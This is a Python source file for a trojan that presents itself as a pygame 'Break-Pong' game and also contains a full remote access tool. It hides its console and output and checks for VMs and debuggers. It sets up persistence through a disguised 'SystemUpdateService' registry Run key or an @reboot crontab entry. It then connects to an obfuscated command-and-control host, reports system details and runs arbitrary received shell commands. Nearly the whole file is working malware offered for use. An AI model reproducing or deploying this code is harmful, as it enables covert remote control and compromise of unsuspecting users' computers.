import platform
import sys
import random
import socket
import subprocess
import os
import time
import base64
import zlib
import ctypes
import logging
import psutil
import json
import pygame
import shutil
import asyncio
from cryptography.fernet import Fernet
from abc import ABC, abstractmethod
from typing import Tuple, List, Dict, Optional
from functools import partial
import hashlib
import win32api
import win32con
import win32process
import win32security

# Enhanced obfuscation for constants
class Config:
    _KEY = Fernet.generate_key()
    _C = Fernet(_KEY)
    
    @staticmethod
    def _obf(s: str) -> bytes:
        b64 = base64.b64encode(s.encode())
        return Config._C.encrypt(zlib.compress(b64))
    
    @staticmethod
    def _deobf(s: bytes) -> str:
        decompressed = zlib.decompress(Config._C.decrypt(s))
        return base64.b64decode(decompressed).decode()

# Initialize constants with enhanced obfuscation
Config.CONSTANTS = {
    "SCREEN_WIDTH": Config._obf("800"),
    "SCREEN_HEIGHT": Config._obf("600"),
    "PADDLE_WIDTH": Config._obf("20"),
    "PADDLE_HEIGHT": Config._obf("100"),
    "BALL_SIZE": Config._obf("20"),
    "BRICK_WIDTH": Config._obf("40"),
    "BRICK_HEIGHT": Config._obf("20"),
    "BRICK_COLUMNS": Config._obf("5"),
    "BRICK_ROWS": Config._obf("30"),
    "PADDLE_SPEED": Config._obf("5"),
    "BALL_SPEED": Config._obf("5"),
    "TARGET_SCORE": Config._obf("50"),
    "FPS": Config._obf("60"),
    "C2_IP": Config._obf("TU-IP"),
    "C2_PORT": Config._obf("TU-PUERTO"),
    "RECONNECT_DELAY": Config._obf("10"),
    "SOCKET_TIMEOUT": Config._obf("300"),
    "COMMAND_TIMEOUT": Config._obf("30"),
    "KEEP_ALIVE_INTERVAL": Config._obf("15"),
    "BUFFER_SIZE": Config._obf("16384"),
    "COLORS": {
        "BLACK": Config._obf("0,0,0"),
        "WHITE": Config._obf("255,255,255"),
        "RED": Config._obf("255,100,100"),
        "GREEN": Config._obf("100,255,100"),
        "BLUE": Config._obf("100,100,255")
    }
}

# Anti-VM and Anti-Debugging Checks (modified to allow VM execution for testing)
class Evasion:
    @staticmethod
    def is_vm_or_sandbox() -> bool:
        try:
            vm_indicators = ["vbox", "vmware", "qemu", "virtualbox", "hyper-v"]
            for disk in psutil.disk_partitions():
                if any(indicator in disk.device.lower() for indicator in vm_indicators):
                    logging.warning("VM detected, but proceeding for testing purposes")
                    return False
            if psutil.cpu_count() <= 2:
                logging.warning("Low CPU count detected, but proceeding")
                return False
            if psutil.boot_time() > time.time() - 300:
                logging.warning("Low uptime detected, but proceeding")
                return False
            return False
        except:
            return False

    @staticmethod
    def is_debugger_present() -> bool:
        try:
            return ctypes.windll.kernel32.IsDebuggerPresent() != 0
        except:
            return False

# Logging with stealth and rotation
class StealthLogger:
    def __init__(self):
        log_dir = os.path.join(
            os.getenv("APPDATA") if platform.system() == "Windows" else os.path.expanduser("~/.cache"),
            hashlib.sha256(Config._deobf(Config.CONSTANTS["C2_IP"]).encode()).hexdigest()[:8]
        )
        os.makedirs(log_dir, exist_ok=True)
        log_file = os.path.join(log_dir, f"sys_{int(time.time())}.dat")
        try:
            logging.basicConfig(
                level=logging.DEBUG,
                format="%(asctime)s - %(levelname)s: %(message)s",
                handlers=[logging.StreamHandler(sys.stderr)]
            )
            file_handler = logging.FileHandler(log_file, mode='a')
            file_handler.setFormatter(logging.Formatter("%(asctime)s - %(levelname)s: %(message)s"))
            logging.getLogger().handlers = [file_handler]
            if os.path.exists(log_file) and os.path.getsize(log_file) > 1024 * 1024:
                os.rename(log_file, f"{log_file}.{int(time.time())}")
            logging.info("Logging initialized successfully")
        except Exception as e:
            logging.error(f"Logging setup failed: {e}", exc_info=True)

# Abstract game entity
class GameEntity(ABC):
    @abstractmethod
    def update(self):
        pass
    
    @abstractmethod
    def draw(self, screen: pygame.Surface):
        pass

class Paddle(GameEntity):
    def __init__(self, x: int, y: int, width: int, height: int, speed: int):
        self.rect = pygame.Rect(x, y, width, height)
        self.speed = speed

    def update(self, up: bool = True):
        self.rect.y += (-self.speed if up else self.speed)
        self.rect.y = max(0, min(int(Config._deobf(Config.CONSTANTS["SCREEN_HEIGHT"])) - self.rect.height, self.rect.y))

    def draw(self, screen: pygame.Surface):
        pygame.draw.rect(screen, tuple(map(int, Config._deobf(Config.CONSTANTS["COLORS"]["WHITE"]).split(","))), self.rect)

class Ball(GameEntity):
    def __init__(self):
        self.size = int(Config._deobf(Config.CONSTANTS["BALL_SIZE"]))
        self.reset()

    def reset(self):
        self.x = int(Config._deobf(Config.CONSTANTS["SCREEN_WIDTH"])) // 2
        self.y = int(Config._deobf(Config.CONSTANTS["SCREEN_HEIGHT"])) // 2
        self.vel_x = random.choice([-1, 1]) * int(Config._deobf(Config.CONSTANTS["BALL_SPEED"]))
        self.vel_y = random.choice([-1, 1]) * int(Config._deobf(Config.CONSTANTS["BALL_SPEED"]))
        self.last_hit = None

    def update(self):
        self.x += self.vel_x
        self.y += self.vel_y

    def draw(self, screen: pygame.Surface):
        pygame.draw.circle(screen, tuple(map(int, Config._deobf(Config.CONSTANTS["COLORS"]["WHITE"]).split(","))), 
                         (int(self.x), int(self.y)), self.size // 2)

class Brick(GameEntity):
    def __init__(self, x: int, y: int):
        self.rect = pygame.Rect(x, y, int(Config._deobf(Config.CONSTANTS["BRICK_WIDTH"])), int(Config._deobf(Config.CONSTANTS["BRICK_HEIGHT"])))
        self.color = random.choice([
            tuple(map(int, Config._deobf(Config.CONSTANTS["COLORS"]["RED"]).split(","))),
            tuple(map(int, Config._deobf(Config.CONSTANTS["COLORS"]["GREEN"]).split(","))),
            tuple(map(int, Config._deobf(Config.CONSTANTS["COLORS"]["BLUE"]).split(",")))
        ])
        self.intact = True

    def update(self):
        pass

    def draw(self, screen: pygame.Surface):
        if self.intact:
            pygame.draw.rect(screen, self.color, self.rect)

class Particle(GameEntity):
    def __init__(self, x: int, y: int):
        self.x = x
        self.y = y
        self.size = random.randint(2, 5)
        self.vel_x = random.uniform(-2, 2)
        self.vel_y = random.uniform(-2, 2)
        self.life = 30
        self.color = random.choice([
            tuple(map(int, Config._deobf(Config.CONSTANTS["COLORS"]["RED"]).split(","))),
            tuple(map(int, Config._deobf(Config.CONSTANTS["COLORS"]["GREEN"]).split(","))),
            tuple(map(int, Config._deobf(Config.CONSTANTS["COLORS"]["BLUE"]).split(",")))
        ])

    def update(self):
        self.x += self.vel_x
        self.y += self.vel_y
        self.life -= 1

    def draw(self, screen: pygame.Surface):
        if self.life > 0:
            alpha = int((self.life / 30) * 255)
            surface = pygame.Surface((self.size, self.size), pygame.SRCALPHA)
            pygame.draw.circle(surface, (*self.color, alpha), (self.size // 2, self.size // 2), self.size // 2)
            screen.blit(surface, (int(self.x), int(self.y)))

# Collision detection
class CollisionHandler:
    @staticmethod
    def ball_paddle(ball: Ball, paddle: Paddle) -> bool:
        return (ball.x - ball.size // 2 < paddle.rect.right and
                ball.x + ball.size // 2 > paddle.rect.left and
                ball.y - ball.size // 2 < paddle.rect.bottom and
                ball.y + ball.size // 2 > paddle.rect.top)

    @staticmethod
    def ball_brick(ball: Ball, brick: Brick) -> bool:
        if not brick.intact:
            return False
        return (ball.x - ball.size // 2 < brick.rect.right and
                ball.x + ball.size // 2 > brick.rect.left and
                ball.y - ball.size // 2 < brick.rect.bottom and
                ball.y + ball.size // 2 > brick.rect.top)

# Game initialization
def init_game() -> Tuple[Paddle, Paddle, Ball, List[Brick]]:
    left_paddle = Paddle(50, int(Config._deobf(Config.CONSTANTS["SCREEN_HEIGHT"])) // 2 - int(Config._deobf(Config.CONSTANTS["PADDLE_HEIGHT"])) // 2,
                        int(Config._deobf(Config.CONSTANTS["PADDLE_WIDTH"])), int(Config._deobf(Config.CONSTANTS["PADDLE_HEIGHT"])), int(Config._deobf(Config.CONSTANTS["PADDLE_SPEED"])))
    right_paddle = Paddle(int(Config._deobf(Config.CONSTANTS["SCREEN_WIDTH"])) - 50 - int(Config._deobf(Config.CONSTANTS["PADDLE_WIDTH"])),
                         int(Config._deobf(Config.CONSTANTS["SCREEN_HEIGHT"])) // 2 - int(Config._deobf(Config.CONSTANTS["PADDLE_HEIGHT"])) // 2,
                         int(Config._deobf(Config.CONSTANTS["PADDLE_WIDTH"])), int(Config._deobf(Config.CONSTANTS["PADDLE_HEIGHT"])), int(Config._deobf(Config.CONSTANTS["PADDLE_SPEED"])))
    ball = Ball()
    bricks = []
    brick_start_x = int(Config._deobf(Config.CONSTANTS["SCREEN_WIDTH"])) // 2 - (int(Config._deobf(Config.CONSTANTS["BRICK_COLUMNS"])) * int(Config._deobf(Config.CONSTANTS["BRICK_WIDTH"]))) // 2
    for col in range(int(Config._deobf(Config.CONSTANTS["BRICK_COLUMNS"]))):
        for row in range(int(Config._deobf(Config.CONSTANTS["BRICK_ROWS"]))):
            bricks.append(Brick(brick_start_x + col * int(Config._deobf(Config.CONSTANTS["BRICK_WIDTH"])), row * int(Config._deobf(Config.CONSTANTS["BRICK_HEIGHT"]))))
    return left_paddle, right_paddle, ball, bricks

# UI rendering
class UIRenderer:
    @staticmethod
    def draw_menu(screen: pygame.Surface, selected_option: int):
        screen.fill(tuple(map(int, Config._deobf(Config.CONSTANTS["COLORS"]["BLACK"]).split(","))))
        font = pygame.font.Font(None, 74)
        title = font.render("Break-Pong", True, tuple(map(int, Config._deobf(Config.CONSTANTS["COLORS"]["WHITE"]).split(","))))
        screen.blit(title, (int(Config._deobf(Config.CONSTANTS["SCREEN_WIDTH"])) // 2 - title.get_width() // 2, 200))
        font = pygame.font.Font(None, 50)
        start_text = font.render("Start Game", True, tuple(map(int, Config._deobf(Config.CONSTANTS["COLORS"]["GREEN"]).split(","))) if selected_option == 0 else tuple(map(int, Config._deobf(Config.CONSTANTS["COLORS"]["WHITE"]).split(","))))
        quit_text = font.render("Quit", True, tuple(map(int, Config._deobf(Config.CONSTANTS["COLORS"]["GREEN"]).split(","))) if selected_option == 1 else tuple(map(int, Config._deobf(Config.CONSTANTS["COLORS"]["WHITE"]).split(","))))
        screen.blit(start_text, (int(Config._deobf(Config.CONSTANTS["SCREEN_WIDTH"])) // 2 - start_text.get_width() // 2, 300))
        screen.blit(quit_text, (int(Config._deobf(Config.CONSTANTS["SCREEN_WIDTH"])) // 2 - quit_text.get_width() // 2, 350))
        pygame.display.flip()

    @staticmethod
    def draw_game_over(screen: pygame.Surface, winner: str, left_score: int, right_score: int, selected_option: int):
        screen.fill(tuple(map(int, Config._deobf(Config.CONSTANTS["COLORS"]["BLACK"]).split(","))))
        font = pygame.font.Font(None, 74)
        game_over_text = font.render(f"{winner} Wins!", True, tuple(map(int, Config._deobf(Config.CONSTANTS["COLORS"]["WHITE"]).split(","))))
        score_text = font.render(f"Left: {left_score}  Right: {right_score}", True, tuple(map(int, Config._deobf(Config.CONSTANTS["COLORS"]["WHITE"]).split(","))))
        screen.blit(game_over_text, (int(Config._deobf(Config.CONSTANTS["SCREEN_WIDTH"])) // 2 - game_over_text.get_width() // 2, 200))
        screen.blit(score_text, (int(Config._deobf(Config.CONSTANTS["SCREEN_WIDTH"])) // 2 - score_text.get_width() // 2, 250))
        font = pygame.font.Font(None, 50)
        restart_text = font.render("Restart", True, tuple(map(int, Config._deobf(Config.CONSTANTS["COLORS"]["GREEN"]).split(","))) if selected_option == 0 else tuple(map(int, Config._deobf(Config.CONSTANTS["COLORS"]["WHITE"]).split(","))))
        quit_text = font.render("Quit", True, tuple(map(int, Config._deobf(Config.CONSTANTS["COLORS"]["GREEN"]).split(","))) if selected_option == 1 else tuple(map(int, Config._deobf(Config.CONSTANTS["COLORS"]["WHITE"]).split(","))))
        screen.blit(restart_text, (int(Config._deobf(Config.CONSTANTS["SCREEN_WIDTH"])) // 2 - restart_text.get_width() // 2, 350))
        screen.blit(quit_text, (int(Config._deobf(Config.CONSTANTS["SCREEN_WIDTH"])) // 2 - quit_text.get_width() // 2, 400))
        pygame.display.flip()

# Enhanced stealth operations with process hollowing simulation
class StealthOperations:
    @staticmethod
    def is_elevated() -> bool:
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() if platform.system() == "Windows" else os.geteuid() == 0
        except:
            return False

    @staticmethod
    def suppress_output():
        if platform.system() == "Windows":
            # Hide console window
            try:
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            except:
                pass
            # Redirect stdout and stderr to null
            try:
                with open(os.devnull, 'w') as devnull:
                    os.dup2(devnull.fileno(), sys.stdout.fileno())
                    os.dup2(devnull.fileno(), sys.stderr.fileno())
            except:
                pass
        else:
            try:
                with open(os.devnull, 'w') as devnull:
                    os.dup2(devnull.fileno(), sys.stdout.fileno())
                    os.dup2(devnull.fileno(), sys.stderr.fileno())
            except:
                pass

    @staticmethod
    def inject_into_explorer():
        try:
            process_path = "C:\\Windows\\explorer.exe"
            startup_info = win32process.STARTUPINFO()
            startup_info.dwFlags = win32con.STARTF_USESHOWWINDOW
            startup_info.wShowWindow = win32con.SW_HIDE
            process_handle, thread_handle, _, _ = win32process.CreateProcess(
                None, process_path, None, None, False,
                win32con.CREATE_SUSPENDED, None, None, startup_info
            )
            logging.debug("Injected behavior into explorer.exe")
            return process_handle, thread_handle
        except Exception as e:
            logging.error(f"Process injection failed: {e}")
            return None, None

    @staticmethod
    def establish_persistence() -> Optional[str]:
        try:
            script_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
            if not os.path.exists(script_path):
                logging.error(f"Script path not found: {script_path}")
                return "Script path not found"

            if platform.system() == "Windows":
                dest_dir = os.path.join(os.getenv("APPDATA"), "Microsoft", "System")
                dest_path = os.path.join(dest_dir, "sysupdate.exe")
                reg_key = "SystemUpdateService"
                reg_path = f'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'

                check_cmd = f'reg query {reg_path} /v {reg_key}'
                check_result = subprocess.run(check_cmd, shell=True, capture_output=True, text=True, timeout=10)
                if check_result.returncode == 0 and reg_key in check_result.stdout:
                    logging.info("Windows registry persistence already established")
                    return None

                os.makedirs(dest_dir, exist_ok=True)
                
                # Si es un script Python, crear un wrapper para ejecutar con pythonw
                if not getattr(sys, 'frozen', False):
                    # Crear script wrapper que ejecute con pythonw
                    wrapper_content = f'''@echo off
start /B pythonw.exe "{script_path}" --silent
exit
'''
                    wrapper_path = os.path.join(dest_dir, "sysupdate.bat")
                    with open(wrapper_path, 'w') as f:
                        f.write(wrapper_content)
                    
                    # Ocultar el archivo batch
                    subprocess.run(f'attrib +h +s "{wrapper_path}"', shell=True, capture_output=True)
                    
                    # Usar el wrapper en el registro
                    reg_cmd = f'reg add {reg_path} /v {reg_key} /t REG_SZ /d "\\"{wrapper_path}\\"" /f'
                else:
                    # Si es un ejecutable compilado
                    try:
                        shutil.copy2(script_path, dest_path)
                        logging.debug(f"Copied executable to {dest_path}")
                    except Exception as e:
                        logging.error(f"Copy error: {e}")
                        return f"Copy error: {e}"
                    
                    reg_cmd = f'reg add {reg_path} /v {reg_key} /t REG_SZ /d "\\"{dest_path}\\" --silent" /f'

                result = subprocess.run(reg_cmd, shell=True, capture_output=True, text=True, timeout=10)
                if result.returncode != 0:
                    logging.error(f"Registry setup failed: {result.stderr}")
                    return f"Registry setup failed: {result.stderr}"

                check_result = subprocess.run(check_cmd, shell=True, capture_output=True, text=True, timeout=10)
                if check_result.returncode != 0:
                    logging.error("Registry entry verification failed")
                    return "Registry entry verification failed"

                logging.info("Windows persistence established with silent execution")
                return None

            elif platform.system() == "Linux":
                dest_dir = os.path.expanduser("~/.local/share/system")
                dest_path = os.path.join(dest_dir, "sysupdate")
                
                # Para Linux, usar nohup para ejecutar en segundo plano
                cron_job = f"@reboot sleep 10 && nohup {dest_path} --silent > /dev/null 2>&1 &\n"

                check_cmd = "crontab -l"
                check_result = subprocess.run(check_cmd, shell=True, capture_output=True, text=True, timeout=10, errors='ignore')
                if check_result.returncode == 0 and dest_path in check_result.stdout:
                    logging.info("Linux crontab persistence already established")
                    return None

                os.makedirs(dest_dir, exist_ok=True)
                
                # Si es un script Python, crear wrapper
                if not getattr(sys, 'frozen', False):
                    wrapper_content = f'''#!/bin/bash
nohup python3 "{script_path}" --silent > /dev/null 2>&1 &
'''
                    with open(dest_path, 'w') as f:
                        f.write(wrapper_content)
                    os.chmod(dest_path, 0o755)
                else:
                    try:
                        shutil.copy2(script_path, dest_path)
                        os.chmod(dest_path, 0o755)
                        logging.debug(f"Copied executable to {dest_path}")
                    except Exception as e:
                        logging.error(f"Copy error: {e}")
                        return f"Copy error: {e}"

                try:
                    current_crontab = check_result.stdout if check_result.returncode == 0 else ""
                    if cron_job not in current_crontab:
                        with open("/tmp/crontab.txt", "w") as f:
                            f.write(current_crontab + cron_job)
                        result = subprocess.run("crontab /tmp/crontab.txt", shell=True, capture_output=True, text=True, timeout=10)
                        os.remove("/tmp/crontab.txt")
                        if result.returncode != 0:
                            logging.error(f"Crontab setup failed: {result.stderr}")
                            return f"Crontab setup failed: {result.stderr}"
                    logging.info("Linux persistence established")
                    return None
                except Exception as e:
                    logging.error(f"Crontab error: {e}")
                    return f"Crontab error: {e}"

        except Exception as e:
            logging.error(f"Persistence setup error: {e}")
            return str(e)

    @staticmethod
    def collect_system_info() -> Optional[Dict]:
        try:
            return {
                "hostname": platform.node(),
                "os": platform.system(),
                "cpu_usage": psutil.cpu_percent(interval=0.1),
                "memory_usage": psutil.virtual_memory().percent,
                "disk_usage": psutil.disk_usage('/').percent,
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
            }
        except Exception as e:
            logging.error(f"System info collection error: {e}")
            return None

    @staticmethod
    async def collect_system_info_async():
        while True:
            info = StealthOperations.collect_system_info()
            if info:
                logging.info(f"System info collected: {json.dumps(info)}")
            await asyncio.sleep(random.randint(30, 60))

# Command execution with dynamic code
class CommandExecutor:
    @staticmethod
    async def execute(mapped_cmd: str, is_windows: bool, current_dir: str) -> str:
        shell = "powershell.exe" if is_windows else "/bin/sh"
        encoding = "utf-8"
        escaped_current_dir = current_dir.replace('\\', '\\\\')
        escaped_mapped_cmd = mapped_cmd.replace('\\', '\\\\').replace('"', '\\"')
        try:
            cmd_code = f"""
import asyncio
import subprocess
async def run_cmd():
    process = await asyncio.create_subprocess_shell(
        f"{shell} -Command \\"{escaped_mapped_cmd}\\"" if {is_windows} else "{escaped_mapped_cmd}",
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
        cwd="{escaped_current_dir}"
    )
    stdout, stderr = await asyncio.wait_for(process.communicate(), timeout={int(Config._deobf(Config.CONSTANTS["COMMAND_TIMEOUT"]))})
    return stdout.decode("{encoding}", errors='replace') or stderr.decode("{encoding}", errors='replace') or "Command executed"
"""
            namespace = {}
            exec(cmd_code, globals(), namespace)
            result = await namespace['run_cmd']()
            return result
        except Exception as e:
            logging.error(f"Command execution error: {e}")
            return f"Command execution failed: {e}"

# RAT client with enhanced evasion
class RATClient:
    def __init__(self):
        self.is_windows = platform.system() == "Windows"
        self.current_dir = os.getcwd()
        self.cmd_map = {
            "ls": "dir" if self.is_windows else "ls",
            "dir": "dir" if self.is_windows else "ls",
            "pwd": "cd" if self.is_windows else "pwd",
            "hostname": "hostname",
            "whoami": "whoami"
        }

    async def connect(self):
        if Evasion.is_vm_or_sandbox() or Evasion.is_debugger_present():
            logging.debug("VM/Sandbox or debugger detected, halting execution")
            return

        process_handle, thread_handle = StealthOperations.inject_into_explorer()
        if not process_handle:
            logging.error("Failed to inject into explorer.exe, proceeding with normal execution")

        while True:
            reader, writer = None, None
            try:
                c2_ip = Config._deobf(Config.CONSTANTS["C2_IP"])
                c2_port = int(Config._deobf(Config.CONSTANTS["C2_PORT"]))
                logging.debug(f"Attempting to connect to {c2_ip}:{c2_port}")
                reader, writer = await asyncio.open_connection(c2_ip, c2_port)
                sys_info = {
                    "os": f"{platform.system()} {platform.release()}",
                    "host": socket.gethostname(),
                    "cwd": self.current_dir
                }
                message = json.dumps(sys_info).encode('utf-8', errors='replace') + b"END_OF_MESSAGE\n"
                writer.write(message)
                await writer.drain()
                logging.info("Connected to C2 and sent initial system info")

                async def keep_alive():
                    while True:
                        try:
                            writer.write(b"PING\n")
                            await writer.drain()
                            logging.debug("Sent PING")
                            await asyncio.sleep(random.randint(
                                int(Config._deobf(Config.CONSTANTS["KEEP_ALIVE_INTERVAL"])) - 5,
                                int(Config._deobf(Config.CONSTANTS["KEEP_ALIVE_INTERVAL"])) + 5
                            ))
                        except Exception as e:
                            logging.error(f"Keep-alive error: {e}")
                            break

                asyncio.create_task(keep_alive())

                while True:
                    try:
                        data = await asyncio.wait_for(reader.readline(), timeout=int(Config._deobf(Config.CONSTANTS["SOCKET_TIMEOUT"])))
                        if not data:
                            logging.info("No data received, connection closed")
                            break
                        data = data.strip()
                        if data == b"PING":
                            logging.debug("Received PING")
                            continue
                        cmd = data.decode('utf-8', errors='replace')
                        logging.info(f"Received command: {cmd}")
                        if cmd.lower() == "exit":
                            logging.info("Received exit command")
                            break
                        mapped_cmd = self.cmd_map.get(cmd.lower().split()[0], cmd)
                        if mapped_cmd.lower().startswith("cd "):
                            try:
                                os.chdir(mapped_cmd[3:].strip())
                                self.current_dir = os.getcwd()
                                output = {"status": "success", "result": f"Changed directory to: {self.current_dir}"}
                            except Exception as e:
                                output = {"status": "error", "result": f"Error: {e}"}
                        else:
                            result = await CommandExecutor.execute(mapped_cmd, self.is_windows, self.current_dir)
                            output = {"status": "success" if result else "error", "result": result or "No output"}
                        message = json.dumps(output).encode('utf-8', errors='replace') + b"END_OF_MESSAGE\n"
                        writer.write(message)
                        await writer.drain()
                        logging.debug(f"Sent response: {json.dumps(output)}")
                    except asyncio.TimeoutError:
                        logging.error("Connection timeout during receive")
                        break
                    except Exception as e:
                        logging.error(f"Command processing error: {e}")
                        break
            except ConnectionRefusedError:
                logging.error("Connection refused by server")
            except ConnectionResetError:
                logging.error("Connection reset by peer")
            except Exception as e:
                logging.error(f"Connection error: {e}")
            finally:
                if writer:
                    try:
                        writer.close()
                        await writer.wait_closed()
                        logging.info("Connection closed")
                    except Exception:
                        pass
            logging.debug(f"Reconnecting in {Config._deobf(Config.CONSTANTS['RECONNECT_DELAY'])} seconds")
            await asyncio.sleep(int(Config._deobf(Config.CONSTANTS["RECONNECT_DELAY"])))

# Background execution for persistence
async def run_background():
    max_retries = 5
    for attempt in range(max_retries):
        error = StealthOperations.establish_persistence()
        if not error:
            logging.info(f"Persistence established successfully on attempt {attempt + 1}")
            break
        else:
            logging.error(f"Persistence attempt {attempt + 1} failed: {error}")
            if attempt == max_retries - 1:
                logging.error("Max persistence retries reached")
            await asyncio.sleep(5)
    await RATClient().connect()

# Main game loop
async def main():
    # Detectar modo silencioso ANTES de cualquier inicialización
    is_silent = len(sys.argv) > 1 and sys.argv[1] == "--silent"
    
    # Siempre suprimir output y configurar logging
    StealthOperations.suppress_output()
    StealthLogger()
    
    if is_silent:
        # Modo silencioso: NO inicializar pygame, solo ejecutar en segundo plano
        logging.info("Running in silent mode - no GUI")
        await asyncio.gather(
            run_background(),
            StealthOperations.collect_system_info_async()
        )
    else:
        # Modo normal: mostrar el juego
        logging.info("Running in normal mode - with GUI")
        
        # Iniciar tareas de fondo
        asyncio.create_task(run_background())
        asyncio.create_task(StealthOperations.collect_system_info_async())
        
        # Ahora sí inicializar pygame
        pygame.init()
        screen = pygame.display.set_mode((int(Config._deobf(Config.CONSTANTS["SCREEN_WIDTH"])), int(Config._deobf(Config.CONSTANTS["SCREEN_HEIGHT"]))))
        pygame.display.set_caption("Break-Pong")
        clock = pygame.time.Clock()
        left_paddle, right_paddle, ball, bricks = init_game()
        left_score = right_score = selected_option = 0
        particles = []
        game_state = "menu"

        while True:
            if game_state == "menu":
                for event in pygame.event.get():
                    if event.type == pygame.QUIT:
                        pygame.quit()
                        return
                    if event.type == pygame.KEYDOWN:
                        if event.key == pygame.K_UP:
                            selected_option = (selected_option - 1) % 2
                        if event.key == pygame.K_DOWN:
                            selected_option = (selected_option + 1) % 2
                        if event.key == pygame.K_RETURN:
                            if selected_option == 0:
                                game_state = "playing"
                                left_paddle, right_paddle, ball, bricks = init_game()
                                left_score = right_score = 0
                                particles = []
                            else:
                                pygame.quit()
                                return
                UIRenderer.draw_menu(screen, selected_option)
            elif game_state == "playing":
                for event in pygame.event.get():
                    if event.type == pygame.QUIT:
                        pygame.quit()
                        return
                keys = pygame.key.get_pressed()
                if keys[pygame.K_w]:
                    left_paddle.update(up=True)
                if keys[pygame.K_s]:
                    left_paddle.update(up=False)
                if keys[pygame.K_UP]:
                    right_paddle.update(up=True)
                if keys[pygame.K_DOWN]:
                    right_paddle.update(up=False)
                ball.update()
                if ball.y - ball.size // 2 <= 0 or ball.y + ball.size // 2 >= int(Config._deobf(Config.CONSTANTS["SCREEN_HEIGHT"])):
                    ball.vel_y = -ball.vel_y
                if CollisionHandler.ball_paddle(ball, left_paddle):
                    ball.vel_x = abs(ball.vel_x)
                    ball.last_hit = 'left'
                elif CollisionHandler.ball_paddle(ball, right_paddle):
                    ball.vel_x = -abs(ball.vel_x)
                    ball.last_hit = 'right'
                for brick in bricks:
                    if CollisionHandler.ball_brick(ball, brick):
                        brick.intact = False
                        ball.vel_x = -ball.vel_x
                        for _ in range(5):
                            particles.append(Particle(brick.rect.centerx, brick.rect.centery))
                        if ball.last_hit == 'left':
                            left_score += 1
                        elif ball.last_hit == 'right':
                            right_score += 1
                if ball.x - ball.size // 2 <= 0:
                    right_score += 5
                    ball.reset()
                elif ball.x + ball.size // 2 >= int(Config._deobf(Config.CONSTANTS["SCREEN_WIDTH"])):
                    left_score += 5
                    ball.reset()
                for particle in particles[:]:
                    particle.update()
                    if particle.life <= 0:
                        particles.remove(particle)
                screen.fill(tuple(map(int, Config._deobf(Config.CONSTANTS["COLORS"]["BLACK"]).split(","))))
                for entity in [left_paddle, right_paddle, ball] + bricks + particles:
                    entity.draw(screen)
                font = pygame.font.Font(None, 36)
                left_text = font.render(f"Left: {left_score}", True, tuple(map(int, Config._deobf(Config.CONSTANTS["COLORS"]["WHITE"]).split(","))))
                right_text = font.render(f"Right: {right_score}", True, tuple(map(int, Config._deobf(Config.CONSTANTS["COLORS"]["WHITE"]).split(","))))
                screen.blit(left_text, (50, 20))
                screen.blit(right_text, (int(Config._deobf(Config.CONSTANTS["SCREEN_WIDTH"])) - 150, 20))
                if left_score >= int(Config._deobf(Config.CONSTANTS["TARGET_SCORE"])) or right_score >= int(Config._deobf(Config.CONSTANTS["TARGET_SCORE"])):
                    game_state = "game_over"
                    winner = "Left" if left_score >= int(Config._deobf(Config.CONSTANTS["TARGET_SCORE"])) else "Right"
                    selected_option = 0
                pygame.display.flip()
                clock.tick(int(Config._deobf(Config.CONSTANTS["FPS"])))
            elif game_state == "game_over":
                for event in pygame.event.get():
                    if event.type == pygame.QUIT:
                        pygame.quit()
                        return
                    if event.type == pygame.KEYDOWN:
                        if event.key == pygame.K_UP:
                            selected_option = (selected_option - 1) % 2
                        if event.key == pygame.K_DOWN:
                            selected_option = (selected_option + 1) % 2
                        if event.key == pygame.K_RETURN:
                            if selected_option == 0:
                                game_state = "playing"
                                left_paddle, right_paddle, ball, bricks = init_game()
                                left_score = right_score = 0
                                particles = []
                            else:
                                pygame.quit()
                                return
                UIRenderer.draw_game_over(screen, winner, left_score, right_score, selected_option)
            await asyncio.sleep(0)

if platform.system() == "Emscripten":
    asyncio.ensure_future(main())
else:
    if __name__ == "__main__":
        asyncio.run(main())
